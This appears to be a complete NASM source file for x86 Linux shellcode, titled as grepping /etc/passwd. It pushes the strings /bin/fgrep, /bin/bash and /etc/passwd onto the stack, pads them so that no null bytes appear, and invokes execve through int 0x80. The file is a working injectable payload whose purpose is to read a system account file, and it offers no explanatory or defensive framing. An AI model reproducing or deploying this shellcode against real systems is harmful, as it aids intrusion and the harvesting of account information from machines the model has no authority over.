; fgrep_bin_bash_etc_passwd.nasm
; Author: Chase Hatch

section .text
global _start
_start:
	xor eax,eax

	;instr		;offset	 ;equivalent
	push eax	;48	 ;0x00000000
	push eax	;44	 ;00pe
	push eax	;40	 ;rgf/
	push eax	;36	 ;nib/
	push eax	;32	 ;0x00000000
	push eax	;28	 ;000h
	push eax	;24	 ;sab/
	push eax	;20	 ;nib/
	push eax	;16	 ;0x00000000
	push eax	;12	 ;0dws
	push eax	;8	 ;sap/
	push eax	;4	 ;cte/
	push eax	;0	 ;0x00000000
	lea esi, [esp]
	
	mov dword [esi+44], 0x90907065 	;  pe 
	mov dword [esi+40], 0x7267662f 	;  rgf/ 
	mov dword [esi+36], 0x6e69622f 	;  nib/
	mov word [esi+46], ax
	lea ebx, [esi+36]
	lea edx, [esi+48]
	mov dword [esi+28], 0x90909068 	;  h 
	mov dword [esi+24], 0x7361622f 	;  sab/ 
	mov dword [esi+20], 0x6e69622f 	;  nib/
	mov dword [esi+29], eax
	
	mov dword [esi+12], 0x90647773 	;  dws 
	mov dword [esi+8], 0x7361702f 	;  sap/ 
	mov dword [esi+4], 0x6374652f 	;  cte/
	mov byte [esi+15], al
	
	lea edi, [esi+4]
	push edi
	lea edi, [esi+20]
	push edi
	lea edi, [esi+36]
	push edi
	mov ecx, esp
	mov al, 0xb
	int 0x80 

